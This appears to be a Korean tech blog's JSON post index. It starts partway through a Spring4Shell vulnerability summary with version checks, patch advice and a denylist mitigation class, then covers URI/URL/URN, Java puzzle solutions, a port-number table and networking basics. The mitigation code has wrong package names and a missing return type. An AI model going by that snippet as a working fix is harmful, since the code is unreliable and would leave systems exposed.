방법 (1) Java 버전 확인 : java -version\n(2) Spring 버전 확인 1) pom.xml 내 확인  pom \n2) getVersion() 메서드를 사용 확인 public class CheckSpringVersion{ @Test public void versionTest() throws Exception{ String test=org.springframework.core.SpringVersion.getVersion(); System.out.println(test); } } 5. 대응방안  제조사 홈페이지를 통해 최신버전으로 업데이트 적용  제조사 홈페이지에 신규버전이 계속 업데이트되고 있어 확인 후 업데이트 적용 필요     CVE-2022-22965(Spring4Shell)  Spring Framework 5.3.18, 5.2.20 버전으로 업데이트     신규 업데이트가 불가능할 경우 아래와 같이 조치 적용   CVE-2022-22965(Spring4Shell) ※ 프로젝트 패키지 아래 해당 전역 클래스 생성 후 재 컴파일(테스트 필요)  import org.springwork.core.Ordered; import org.springwork.core.annotation.Order; import org.springwork.web.bind.WebDataBinder; import org.springwork.web.bind.annotation.ControllerAdvice; import org.springwork.web.bind.annotation.InitBinder; @ControllerAdvice @Order(10000) public class BinderControllerAdvice { @InitBinder public setAllowedFields(WebDataBinder dataBinder) { String[] denylist = new String[]{\u0026#34;class.*\u0026#34;, \u0026#34;Class.*\u0026#34;, \u0026#34;*.class.*\u0026#34;, \u0026#34;*.Class.*\u0026#34;}; dataBinder.setDisallowedFields(denylist); } } ※ 참고 ※ https://uxicode.tistory.com/entry/%EB%B0%94%EC%9D%B8%EB%94%A9%EC%9D%B4%EB%9E%80\nhttps://velog.io/@thelm3716/spring4shell-%EB%B6%84%EC%84%9D-%EA%B8%80-%EC%A0%95%EB%A6%AC-CVE-2022-22965\nhttps://www.fastly.com/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022\nhttps://unit42.paloaltonetworks.com/cve-2022-22965-springshell/\nhttps://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=66592\nhttps://javamana.com/2022/04/202204022300005716.html\nhttps://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/\nhttps://hackyboiz.github.io/2022/04/03/l0ch/2022-04-03/\nhttps://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/\nhttps://github.com/reznok/Spring4Shell-POC\n","date":"2022-04-10T00:00:00Z","image":"https://appealso.github.io/p/spring4shell-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/spring4shell_hu0e74430e5160ec4f6e5bf648835c9515_5679_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/spring4shell-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/","title":"Spring4Shell 취약점 정리"},{"content":" urlvsurivsurn \nURI  통합 자원 식별자(Uniform Resource Identifier, URI)는 인터넷에 있는 자원을 나타내냄 URI의 존재는 인터넷에서 요구되는 기본조건으로서 인터넷 프로토콜에 항상 붙음 URI의 하위개념으로 URL, URN 이 있음  URL  URL(Uniform Resource Locator)은 네트워크 상에서 자원이 어디 있는지를 알려주기 위한 규약 컴퓨터 네트워크와 검색 메커니즘에서의 위치를 지정하는, 웹 리소스에 대한 구체적인 위치를 나타냄 흔히 웹 사이트 주소로 알고 있지만, URL은 웹 사이트 주소뿐만 아니라 컴퓨터 네트워크상의 자원(프로토콜)을 모두 나타낼 수 있음  URN  URN(Uniform Resource Name, 통합 자원 이름)은 통합자원의 이름 URN은 영속적이고, 위치에 독립적인 자원을 위한 지시자로 사용하기 위해 1997년도 RFC 2141 문서에서 정의됨 URN은 여전히 실험 중인 상태고 아직 널리 채택 되지 않음  결론  단순하게 말하자면, URI는 규약이고, URL은 규약에 대한 형태 수학적으로 말하자면, URL과 URN은 부분집합이라고 생각할 수 있다.  출처 및 참고 https://velog.io/@jch9537/URI-URL\nhttps://ssungkang.tistory.com/entry/WEB-URI-vs-URL-vs-URN-비교-분석\nhttps://mygumi.tistory.com/139\n","date":"2022-03-05T15:34:01+09:00","image":"https://appealso.github.io/p/%EC%9B%B9-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC1-urluriurn/web_huec69e85255479d361775b2ffac2b6328_58393_120x120_fill_q75_box_smart1.jpg","permalink":"https://appealso.github.io/p/%EC%9B%B9-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC1-urluriurn/","title":"웹 기초 정리(1) - URL,URI,URN"},{"content":"문제 3*3 표에 다음과 같이 수가 채워져 있다. 오른쪽 아래 가장 끝 칸은 비어 있는 칸이다.           1 2 3   4 5 6   7 8     어떤 수와 인접해 있는 네 개의 칸 중에 하나가 비어 있으면, 수를 그 칸으로 이동시킬 수가 있다. 물론 표 바깥으로 나가는 경우는 불가능하다. 우리의 목표는 초기 상태가 주어졌을 때, 최소의 이동으로 위와 같은 정리된 상태를 만드는 것이다. 다음의 예를 보자.\n          1  3   4 2 5   7 8 6              1 2 3   4  5   7 8 6              1 2 3   4 5    7 8 6              1 2 3   4 5 6   7 8     가장 윗 상태에서 세 번의 이동을 통해 정리된 상태를 만들 수 있다. 이와 같이 최소 이동 횟수를 구하는 프로그램을 작성하시오.\n입력 세 줄에 걸쳐서 표에 채워져 있는 아홉 개의 수가 주어진다. 한 줄에 세 개의 수가 주어지며, 빈 칸은 0으로 나타낸다.\n출력 첫째 줄에 최소의 이동 횟수를 출력한다. 이동이 불가능한 경우 -1을 출력한다.\n소스 import java.util.*; public class Main { static int[] dx = {0,0,1,-1}; static int[] dy = {1,-1,0,0}; public static void main(String[] args) { Scanner scan = new Scanner(System.in); int start=0; for(int i=0;i\u0026lt;3;i++) for(int j=0;j\u0026lt;3;j++) { int temp=scan.nextInt(); if(temp==0) temp =9; start=start*10+temp; } Queue\u0026lt;Integer\u0026gt; q = new LinkedList\u0026lt;Integer\u0026gt;(); HashMap\u0026lt;Integer,Integer\u0026gt; d = new HashMap\u0026lt;Integer,Integer\u0026gt;(); d.put(start, 0); q.add(start); while(!q.isEmpty()) { int now_n = q.poll(); String now = Integer.toString(now_n); //1 0 3  //4 2 5  //7 8 9  int z = now.indexOf(\u0026#39;9\u0026#39;);//빈칸 위치 저장  int x = z/3; //x좌표 계산  int y = z%3; //y좌표 계산  for(int k=0;k\u0026lt;4;k++) { int nx=x+dx[k]; int ny=y+dy[k]; if(nx\u0026gt;=0\u0026amp;\u0026amp;nx\u0026lt;3\u0026amp;\u0026amp;ny\u0026gt;=0\u0026amp;\u0026amp;ny\u0026lt;3) { StringBuilder next = new StringBuilder(now); char temp = next.charAt(x*3+y); next.setCharAt(x*3+y, next.charAt(nx*3+ny)); next.setCharAt(nx*3+ny,temp); int num=Integer.parseInt(next.toString()); if(!d.containsKey(num)) { d.put(num,d.get(now_n)+1); q.add(num); } } } } if(d.containsKey(123456789)) System.out.println(d.get(123456789)); else System.out.println(-1); } } 문제링크 https://www.acmicpc.net/problem/1525\n","date":"2022-03-05T10:12:19+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-1525-%ED%8D%BC%EC%A6%90/","title":"[Java] 백준 1525 퍼즐"},{"content":"문제 2×N 크기의 넓은 판을 1×2 (또는 2×1) 크기와 2×2 크기의 타일로 채우려고 한다. 여러 가지 경우가 있을 수 있으므로, 각각을 하나의 코드로 대응시켜서 암호화에 이용하려고 한다.\n그런데 문제가 생겼다. 넓은 판을 교환하다 보니 좌우 대칭인 경우가 있어, 뒤집히는 경우 코드가 헷갈리게 되는 경우가 발생한 것이다. 예를 들어 아래의 두 경우는 달라 보이지만 좌우 대칭을 이루고 있다.\n img \nN이 주어지면, 전체 타일 코드의 개수를 구하는 프로그램을 작성하시오. (단, 서로 좌우 대칭을 이루는 중복된 표현은 한 가지 경우로만 처리한다.)\n입력 첫째 줄에 타일의 크기 N(1≤N≤30)이 주어진다.\n출력 첫째 줄에 타일 코드의 개수를 출력한다.\n소스 import java.util.*; public class Main { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int N = sc.nextInt(); long[] a = new long[31]; a[1]=1;a[2]=3; for(int i=3;i\u0026lt;=N;i++) a[i]=a[i-1]+a[i-2]*2; if(N==1) System.out.println(1); else if(N==2) System.out.println(3); else if(N%2==0) System.out.println((a[N]+a[N/2]+a[(N-2)/2]*2)/2); else System.out.println((a[N]+a[(N-1)/2])/2); } } 문제링크 https://www.acmicpc.net/problem/1720\n","date":"2022-03-05T10:09:02+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-1720-%ED%83%80%EC%9D%BC-%EC%BD%94%EB%93%9C/","title":"[Java] 백준 1720 타일 코드"},{"content":"문제 로봇 청소기가 주어졌을 때, 청소하는 영역의 개수를 구하는 프로그램을 작성하시오.\n로봇 청소기가 있는 장소는 N×M 크기의 직사각형으로 나타낼 수 있으며, 1×1크기의 정사각형 칸으로 나누어져 있다. 각각의 칸은 벽 또는 빈 칸이다. 청소기는 바라보는 방향이 있으며, 이 방향은 동, 서, 남, 북중 하나이다. 지도의 각 칸은 (r, c)로 나타낼 수 있고, r은 북쪽으로부터 떨어진 칸의 개수, c는 서쪽으로 부터 떨어진 칸의 개수이다.\n로봇 청소기는 다음과 같이 작동한다.\n 현재 위치를 청소한다. 현재 위치에서 현재 방향을 기준으로 왼쪽방향부터 차례대로 탐색을 진행한다.\na. 왼쪽 방향에 아직 청소하지 않은 공간이 존재한다면, 그 방향으로 회전한 다음 한 칸을 전진하고 1번부터 진행한다.\nb. 왼쪽 방향에 청소할 공간이 없다면, 그 방향으로 회전하고 2번으로 돌아간다.\nc. 네 방향 모두 청소가 이미 되어있거나 벽인 경우에는, 바라보는 방향을 유지한 채로 한 칸 후진을 하고 2번으로 돌아간다.\nd. 네 방향 모두 청소가 이미 되어있거나 벽이면서, 뒤쪽 방향이 벽이라 후진도 할 수 없는 경우에는 작동을 멈춘다.  로봇 청소기는 이미 청소되어있는 칸을 또 청소하지 않으며, 벽을 통과할 수 없다.\n입력 첫째 줄에 세로 크기 N과 가로 크기 M이 주어진다. (3 ≤ N, M ≤ 50)\n둘째 줄에 로봇 청소기가 있는 칸의 좌표 (r, c)와 바라보는 방향 d가 주어진다. d가 0인 경우에는 북쪽을, 1인 경우에는 동쪽을, 2인 경우에는 남쪽을, 3인 경우에는 서쪽을 바라보고 있는 것이다.\n셋째 줄부터 N개의 줄에 장소의 상태가 북쪽부터 남쪽 순서대로, 각 줄은 서쪽부터 동쪽 순서대로 주어진다. 빈 칸은 0, 벽은 1로 주어진다. 장소의 모든 외곽은 벽이다.\n로봇 청소기가 있는 칸의 상태는 항상 빈 칸이다.\n출력 로봇 청소기가 청소하는 칸의 개수를 출력한다.\n소스 import java.util.*; public class P14503 { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int N = sc.nextInt(); int M = sc.nextInt(); int[][] map = new int[N][M]; boolean[][] visited = new boolean[N][M]; int r = sc.nextInt(); int c = sc.nextInt(); int d = sc.nextInt(); int count=0; for(int i=0;i\u0026lt;N;i++) for(int j=0;j\u0026lt;M;j++) map[i][j]=sc.nextInt(); //0:북 1:동 2: 남 3:서  int[] dx = {-1,0,1,0}; int[] dy = {0,1,0,-1}; while(true) { if(visited[r][c]==false) { count++; visited[r][c]=true; } boolean flag = true; for(int i=1;i\u0026lt;=4;i++) { int nd = (4+d-i)%4; int nr = r+dx[nd]; int nc = c+dy[nd]; if(nr\u0026lt;0||nc\u0026lt;0||nr\u0026gt;=N||nc\u0026gt;=M||visited[nr][nc]==true||map[nr][nc]==1) continue; r=nr; c=nc; d=nd; flag=false; break; } if(flag==true) { int nd = (d+2)%4; int nr = r+dx[nd]; int nc = c+dy[nd]; if(map[nr][nc]==1) break; else { r=nr; c=nc; } } }System.out.println(count); } } 문제링크 https://www.acmicpc.net/problem/14503\n","date":"2022-03-04T22:23:10+09:00","permalink":"https://appealso.github.io/p/java-%EB%B0%B1%EC%A4%80-14503-%EB%A1%9C%EB%B4%87-%EC%B2%AD%EC%86%8C%EA%B8%B0/","title":"[Java] 백준 14503 로봇 청소기"},{"content":"문제 드래곤 커브는 다음과 같은 세 가지 속성으로 이루어져 있으며, 이차원 좌표 평면 위에서 정의된다. 좌표 평면의 x축은 → 방향, y축은 ↓ 방향이다.\n 시작 점 시작 방향 세대 0세대 드래곤 커브는 아래 그림과 같은 길이가 1인 선분이다. 아래 그림은 (0, 0)에서 시작하고, 시작 방향은 오른쪽인 0세대 드래곤 커브이다.   image1 \n1세대 드래곤 커브는 0세대 드래곤 커브를 끝 점을 기준으로 시계 방향으로 90도 회전시킨 다음 0세대 드래곤 커브의 끝 점에 붙인 것이다. 끝 점이란 시작 점에서 선분을 타고 이동했을 때, 가장 먼 거리에 있는 점을 의미한다.  image2 \n2세대 드래곤 커브도 1세대를 만든 방법을 이용해서 만들 수 있다. (파란색 선분은 새로 추가된 선분을 나타낸다)\n image3 \n3세대 드래곤 커브도 2세대 드래곤 커브를 이용해 만들 수 있다. 아래 그림은 3세대 드래곤 커브이다.  image4 \n즉, K(K \u0026gt; 1)세대 드래곤 커브는 K-1세대 드래곤 커브를 끝 점을 기준으로 90도 시계 방향 회전 시킨 다음, 그것을 끝 점이 붙인 것이다.\n크기가 100×100인 격자 위에 드래곤 커브가 N개 있다. 이때, 크기가 1×1인 정사각형의 네 꼭짓점이 모두 드래곤 커브의 일부인 정사각형의 개수를 구하는 프로그램을 작성하시오. 격자의 좌표는 (x, y)로 나타내며, 0 ≤ x ≤ 100, 0 ≤ y ≤ 100만 유효한 좌표이다.\n입력 첫째 줄에 드래곤 커브의 개수 N(1 ≤ N ≤ 20)이 주어진다. 둘째 줄부터 N개의 줄에는 드래곤 커브의 정보가 주어진다. 드래곤 커브의 정보는 네 정수 x, y, d, g로 이루어져 있다. x와 y는 드래곤 커브의 시작 점, d는 시작 방향, g는 세대이다. (0 ≤ x, y ≤ 100, 0 ≤ d ≤ 3, 0 ≤ g ≤ 10)\n입력으로 주어지는 드래곤 커브는 격자 밖으로 벗어나지 않는다. 드래곤 커브는 서로 겹칠 수 있다.\n방향은 0, 1, 2, 3 중 하나이고, 다음을 의미한다.\n 0: x좌표가 증가하는 방향 (→) 1: y좌표가 감소하는 방향 (↑) 2: x좌표가 감소하는 방향 (←) 3: y좌표가 증가하는 방향 (↓)  출력 첫째 줄에 크기가 1×1인 정사각형의 네 꼭짓점이 모두 드래곤 커브의 일부인 것의 개수를 출력한다.\n소스 import java.util.*; public class P15685 { static boolean[][] map = new boolean[101][101]; static int[] dx = {1,0,-1,0}; static int[] dy = {0,-1,0,1}; static int N; public static void main(String[] args) { Scanner sc = new Scanner(System.in); N = sc.nextInt(); int[][] dc = new int[N][4]; for(int i=0;i\u0026lt;N;i++) for(int j=0;j\u0026lt;4;j++) dc[i][j]=sc.nextInt(); go(dc); int count=0; for(int i=0;i\u0026lt;100;i++) for(int j=0;j\u0026lt;100;j++) if(map[i][j]\u0026amp;\u0026amp;map[i][j+1]\u0026amp;\u0026amp;map[i+1][j]\u0026amp;\u0026amp;map[i+1][j+1]) count++; System.out.println(count); } static void go(int[][] dc) { for(int i=0;i\u0026lt;N;i++) { ArrayList\u0026lt;Integer\u0026gt; al = new ArrayList\u0026lt;Integer\u0026gt;(); al.add(dc[i][2]); for(int j=0;j\u0026lt;dc[i][3];j++) { int size = al.size(); for(int k=size-1;k\u0026gt;=0;k--) { int temp = al.get(k); if(temp==3) al.add(0); else al.add(temp+1); } } int x=dc[i][0]; int y=dc[i][1]; map[y][x]=true; for(int j=0;j\u0026lt;al.size();j++) { y=y+dy[al.get(j)]; x=x+dx[al.get(j)]; map[y][x]=true; } } } } 문제링크 https://www.acmicpc.net/problem/15685\n","date":"2022-02-27T19:57:18+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15685-%EB%93%9C%EB%9E%98%EA%B3%A4-%EC%BB%A4%EB%B8%8C/","title":"백준 15685 드래곤 커브"},{"content":"이번 포스트에서는 네트워크 기초중의 기초인 Port Number, ACL, VLAN의 대략적인 내용을 정리했습니다. 추가가 필요한 사항은 덧글 남겨주세요~\nWell Known Port Number    포트 TCP UDP 설명 상태     0  UDP 예약됨; 사용하지 않음 공식   1 TCP  TCPMUX(TCP 포트 서비스 멀티플렉서) 공식   7 TCP UDP ECHO 프로토콜 공식   9 TCP UDP DISCARD 프로토콜 공식   13 TCP UDP DAYTIME 프로토콜 공식   17 TCP  QOTD (Quote of the Day) 프로토콜 공식   19 TCP UDP CHARGEN (Character Generator) 프로토콜 - 원격 오류 수정 공식   20 TCP  파일 전송 프로토콜 (FTP, File Transfer Protocol) - 데이터 포트 공식   21 TCP  파일 전송 프로토콜 (FTP, File Transfer Protocol) - 제어 포트 공식   22 TCP  시큐어 셸 (SSH, Secure SHell) - ssh scp, sftp같은 프로토콜 및 포트 포워딩 공식   23 TCP  텔넷 프로토콜 (Telnet Protocol) - 암호화되지 않은 텍스트 통신 공식   24 TCP  개인메일 시스템 공식   25 TCP  SMTP (Simple Mail Transfer Protocol) - 이메일 전송에 사용 공식   37 TCP UDP TIME 프로토콜 공식   49  UDP TACACS 프로토콜 공식   53 TCP UDP 도메인 네임 시스템 (DNS, Domain Name System) 공식   67  UDP BOOTP (부트스트랩 프로토콜) 서버. DHCP로도 사용 공식   68  UDP BOOTP (부트스트랩 프로토콜) 클라이언트. DHCP로도 사용 공식   69  UDP 간단한 파일 전송 프로토콜 (TFTP, Trivial File Transfer Protocol) 공식   70 TCP  고퍼 프로토콜 (Gopher Protocol) 공식   79 TCP  Finger 프로토콜 공식   80 TCP UDP HTTP (HyperText Transfer Protocol) - 웹 페이지 전송 공식   88 TCP  커베로스 - 인증 에이전트 공식   109 TCP  POP2 (Post Office Protocol version 2) - 전자우편 가져오기에 사용 공식   110 TCP  POP3 (Post Office Protocol version 3) - 전자우편 가져오기에 사용 공식   111 TCP UDP RPC (Remote Procedure Call) 공식   113 TCP  ident - 예전 서버 인증 시스템, 현재는 IRC 서버에서 사용자 인증에 사용 공식   119 TCP  NNTP (Network News Transfer Protocol) - 뉴스 그룹 메시지 가져오기에 사용 공식   123  UDP NTP (Network Time Protocol) - 시간 동기화 공식   139 TCP  넷바이오스 (NetBIOS, Network Basic Input/Output System) 공식   143 TCP  인터넷 메시지 접속 프로토콜 4 (IMAP4, Internet Message Access Protocol 4) - 이메일 가져오기에 사용 공식   161  UDP SNMP (Simple Network Management Protocol) - Agent 포트 공식   162  UDP SNMP - Manager 포트 공식   179 TCP  BGP (Border Gateway Protocol) 공식   194 TCP  IRC (Internet Relay Chat) 공식   220 TCP  인터넷 메시지 접속 프로토콜 3 (IMAP3, Internet Message Access Protocol 3)    389 TCP  LDAP (Lightweight Directory Access Protocol) 공식   443 TCP  HTTPS - 보안 소켓 레이어 (SSL, Secure Socket Layer) 위의 HTTP (암호화 전송) 공식   445 TCP  Microsoft-DS (액티브 디렉터리, 윈도 공유, Sasser-worm, Agobot, Zobotworm) 공식   445  UDP Microsoft-DS SMB 파일 공유 공식   465 TCP  SSL 위의 SMTP - Cisco 프로토콜과 충돌 비공식, 충돌   514  UDP syslog 프로토콜 - 시스템 로그 작성 공식   515 TCP  LPD 프로토콜 - 라인 프린터 데몬 서비스 공식   540 TCP  UUCP (Unix-to-Unix Copy Protocol) 공식   542 TCP UDP 상용 (Commerce Applications) (RFC maintained by: Randy Epstein [repstein at host.net]) 공식   587 TCP  email message submission (SMTP) (RFC 2476) 공식   591 TCP  파일메이커 6.0 Web Sharing (HTTP Alternate, see port 80) 공식   631 TCP  인터넷 프린팅 프로토콜 공식   636 TCP  SSL 위의 LDAP (암호화된 전송) 공식   666 TCP  id 소프트웨어의 둠 멀티플레이어 게임 공식   873 TCP  rsync 파일 동기화 프로토콜 공식   981 TCP  SofaWare Technologies Checkpoint Firewall-1 소프트웨어 내장 방화벽의 원격 HTTPS 관리 비공식   990 TCP  SSL 위의 FTP (암호화 전송) 공식   992 TCP  SSL 위의 Telnet (암호화 전송) 공식   993 TCP  SSL 위의 IMAP4 (암호화 전송) 공식   995 TCP  SSL 위의 POP3 (암호화 전송) 공식   1080 TCP UDP SOCKS 프록시 공식   1194 TCP UDP OpenVPN 공식   1900 TCP UDP Simple Service Discovery Protocol (SSDP), UPnP 장치 검출 서비스 공식   3306 TCP  MySQL 공식   3479 TCP UDP 플레이스테이션 네트워크   3480 TCP UDP 플레이스테이션 네트워크   3690 TCP UDP Subversion 공식   5228 TCP UDP HP Virtual    TCP UDP 구글 안드로이드   5353  UDP Multicast DNS 공식   6379 TCP  Redis 서비스 공식   9100 TCP  네트워크 프린팅 프로토콜 비공식   17500 TCP UDP Dropbox LanSync 프로토콜, LAN 상에서 Dropbox 클라이언트끼리 파일목록을 동기화 함 공식    ACL(Access Control List)  네트워크가 구분이 되어있는 구간에 대해서 사용이 가능 특정 포트 또는 구간주소, 포트번호, 옵션, 프로토콜 등을 구분해 허가하거나 거부하는 리스트를 생성해 일종의 방화벽 역할을 수행  VLAN(Virtual Local Area Network)  vlan \n 논리적으로 나뉘어져있는 네트워크 - 가상의 네트워크망 네트워크의 보안성 강화 SWITCH 네트워크 내에서 LoadBalcing이 가능 네트워크 구성 및 설정이 용이하다.  출처 및 참고  https://nasa1515.tech/network-for-beginner2/ https://ko.wikipedia.org/wiki/TCP/UDP의_포트_목록  ","date":"2022-02-19T19:56:54+09:00","image":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-4-well-known-portnumber-acl-vlan/network_hu7c2d7e014291615816b31fb9f4a70106_112373_120x120_fill_q75_box_smart1.jpeg","permalink":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-4-well-known-portnumber-acl-vlan/","title":"네트워크 기초 정리 (4) - Well Known PortNumber, ACL, VLAN"},{"content":"이번 포스트에서는 네트워크 기초중의 기초인 IP/MAC,TCP/UDP의 대략적인 내용을 정리했습니다. 추가가 필요한 사항은 덧글 남겨주세요~\nMAC Address/IP Address MAC Address 개요  MAC \n 2계층에서 사용하는 네트워크 인터페이스에 할당된 고유 식별 주소 OUI (24bit)와 UAA (24bit)로 이루어짐  OUI (Organizational Unique Identifier) UAA (Universally Administered Address)     MAC 주소 변경\nBIA상태로 NIC에 할당되어 있다. 일반적으로 ROM형태로 NIC에 고정시키는 것이기 때문에 주소 변경이 어려움 하지만 결국 메모리에 적재되어 구동되는 것이기 때문에 여러 가지 방법으로 이용해 변경된 MAC주소로 NIC를 동작시킬 수 있음\n 동작방식  NIC는 자신의 MAC주소를 가지고 있고, 전기 신호가 들어오면 Data Link Layer에서 패킷으로 변환하여 목적지 MAC주소를 확인 만약 자신의 주소와 동일하지 않으면 패킷을 폐기 자신의 주소 or 브로드캐스트 or 멀티캐스트 그룹주소인 경우 패킷 정보를 상위 계층 (Network Layer) 으로 넘김   무차별 모드(Promiscuous Mode)\n기본 NIC 동작 방식은 다른 목적지를 가진 패킷을 분석할 수 없음 하지만 다른 목적지를 가진 패킷을 분석하거나 수집해야 할 경우, Promiscuous Mode로 NIC를 구성 이는 자신의 MAC주소와 상관없는 패킷이 들어와도 분석할 수 있도록 메모리에 적재시키기 때문\n IP Address 개요  네트워크 통신에 있어 각각의 통신기기(컴퓨터,스마트폰 등)에 할당된 식별번호를 나타냄 IPv4, IPv6가 존재  IPv4 : 32bit 10진수 (8bit x 4byte) IPv6 : 128bit   4개의 옥텟(Octet)이라고 부르는 8bit 단위로 나누고 각 옥텟은 \u0026ldquo;.\u0026ldquo;으로 구분한 네트워크 주소와 호스트 주소로 나뉨  네트워크 주소: : 호스트들을 모은 네트워크를 지칭하는 주소. 네트워크 주소가 동일한 네트워크를 로켈 네트워크라고 함 호스트 주소 : 하나의 네트워크 내에 존재하는 호스트를 구분하기 위한 주소    IPv4 : 주소체계(Class)  ipclass \n 사설 IP 영역 : 기업 내 인트라넷 등 내부망에 쓰기 위한 예약주소  A Class : 10.0.0.0 ~ 10.255.255.255 B Class : 172.16.0.0 ~ 172.31.255.255 C Class : 192.168.0.0 ~ 192.168.255.255   사용 가능한 호스트 개수\u0026gt;: 2^n-2 (브로드케스트 주소 2개 제외)  서브 네트워크(Sub Network) 서브네팅(Subnetting)  subnetting \n 네트워크 세분화를 위한 IP 주소의 구성을 변경  IP 주소 체계는 [2단계 (네트워크 ID - 호스트 ID)] 에서 [다시 3단계(네트워크 - 서브네트 - 호스트] 로 네트워크 세분화 과정   호스트 구분 ID에 할당된 비트들을 추가적으로 네트워크 구분 ID로 사용 가능  서브넷 마스크(Subnet Mask)  subnetmask \n 서브 네트워크를 만들기 위해 AND 비트 연산에 의해 씌우는 마스크 IP Address에서 첫비트부터 어디까지가 네트워크 부분인가 알려주는 역할. TCP/IP 에서 IP 주소 체계로 네트워크를 분할하는 논리적인 수단 (Mask는 차폐의 의미를 갖음) IP Address처럼 32비트로 구성되며, 네트워크 부분을 표시하는 비트는 1, 호스트 부분은 0  TCP/UDP 프로토콜 TCP(Transmission Control Protocol)  인터넷상에서 데이터를 메세지의 형태로 보내기 위해 IP와 함께 사용하는 프로토콜 신뢰성이 없는 인터넷을 통해 종단간에 신뢰성 있는 바이트 스트림을 전송하도록 특별히 설계 연결형 서비스로 가상 회선 방식을 제공한다 3-way handshaking과정을 통해 연결 설정, 4-way handshaking으로 해제. 흐름 제어 및 혼잡 제어 높은 신뢰성을 보장 UDP보다 속도가 느리다 전이중(Full-Duplex), 점대점(Point to Point) 방식  전이중이란 전송이 양방향으로 동시에 일어날 수 있음을 의미 점대점이란 각 연결이 정확히 2개의 종단점을 가지고 있음을 의미   TCP는 멀티캐스팅이나 브로드캐스팅을 지원하지 않음  TCP 3, 4-WAY HANDSHAKING 로직  3way/4way \n3-WAY HandShake - 연결 생성 (Connection establishment)   클라이언트가 서버에게 SYN 메시지를 보낸다. 이때 SYN/ACK 응답을 기다리는 SYN_SENT 상태가 된다. 이 메시지에 포함된 시퀀스 번호는 클라이언트가 임의로 설정한 값 A(ACK Flag)\n  서버가 클라이언트에게 SYN-ACK 메시지 응답. 이 메시지에 포함된 시퀀스 번호는 서버가 임의로 설정한 값 S, A+1\n  클라이언트가 서버에게 ACK 메시지를 보낸다. 이 메시지에 포함된 응답 번호는 S+1, A+1\n  데이터 전송 (Data transfer) 발생한다. 클라이언트와 서버 모두 데이터와 확인응답을 보낼 수 있다. Client에서 발송시에는 P 플래그를 보내고, 서버는 수신 완료시에 A 플래그를 보낸다.\n A: Ack Flag / S:Syn Flag / P: PSH Flag\n    데이터는 순서에 맞지 않게 도착할 수 있고 또한 수신 TCP에서 일시적으로 보관할 수 있다. 그렇지만 TCP는 세그먼트가 순서에 맞지 않게 프로세스에 전달 되도록 하지 않는다.\n 4-WAY Shake - 연결 종료 (Connection termination)  먼저 연결을 끊고자 하는 쪽을 Active Close라 하고 상대는 Passive Close라 한다.   FIN_WAIT_1 (host A) : close()를 호출하면 \u0026lsquo;연결을 끊겠다\u0026rsquo;라는 신호를 보내기 위해 FIN flag를 1로 설정한 패킷을 상대에게 보내면서 FIN_WAIT_1 상태가 된다. CLOSE_WAIT (host B) : 상대에게 FIN flag가 1인 패킷을 받았다면 \u0026lsquo;연결을 종료하겠다는 것을 일단 알고있겠다.\u0026rsquo; 라는 의미로 해당 패킷에 대한 응답 ACK을 보내고 CLOSE_WAIT 상태가 된다. 출력 버퍼에 있는 데이터를 모두 보낸 다음 서로간의 연결을 끊어야 하므로 ACK 만 보낸다. FIN_WAIT_2 (host A) : ACK을 받고 상대방이 FIN flag가 1인 패킷을 보낼 때까지 기다리는데 이를 FIN_WAIT_2 상태라고 한다. LAST_ACK (host B) : 상대에게 모든 데이터를 보냈다면 close()를 호출해 FIN flag가 1인 패킷을 보낸다. TIME_WAIT (host A) : 상대에게 FIN flag가 1인 패킷을 받았다면 서로가 연결을 끊을 준비가 된 것이므로 이에 대한 응답 ACK을 보낸다. CLOSED : ACK을 받으면 소켓을 닫아 연결을 종료한다.  UDP(User Datagram Protocol)  UDP(User Datagram Protocol, 사용자 데이터그램 프로토콜)는 비연결형 프로토콜 IP 데이터그램을 캡슐화하여 보내는 방법과 연결 설정을 하지 않고 보내는 방법을 제공 UDP는 흐름제어, 오류제어 또는 손상된 세그먼트의 수신에 대한 재전송을 하지 않음 UDP 사용하는 서비스: DNS, 실시간 멀티미디어 등  참고 및 출처  https://velog.io/@evelyn82ny/4-way-handshake https://asfirstalways.tistory.com/327 https://nasa1515.tech/network-for-beginner/#-5-tcpudp-프로토콜 https://velog.io/@kimyeji203/네트워크-IP-주소에-대해서 https://velog.io/@kimyeji203/네트워크-MAC-주소에-대해서  ","date":"2022-02-19T15:11:48+09:00","image":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-3-ip-mac-ipv4-tcp-udp-tcp-34-way-hankshaking/network_hu7c2d7e014291615816b31fb9f4a70106_112373_120x120_fill_q75_box_smart1.jpeg","permalink":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-3-ip-mac-ipv4-tcp-udp-tcp-34-way-hankshaking/","title":"네트워크 기초 정리 (3) - IP, MAC, IPv4, TCP, UDP, TCP 3,4-Way Hankshaking"},{"content":"이번 포스트에서는 네트워크 기초중의 기초인 OSI 7 Layer의 대략적인 내용을 정리했습니다. 추가가 필요한 사항은 덧글 남겨주세요~\nOSI 7 계층  OSI 7 Layer \nL1 물리 계층(Physical Layer)  물리계층은 말 그대로 하드웨어 전송 기술로 이루어 짐 전기적인, 기계적인 신호를 주고받는 역할을하는 계층 데이터의 종류나 오류를 제어 X 통신단위: Bit 대표적인 장비: NIC, 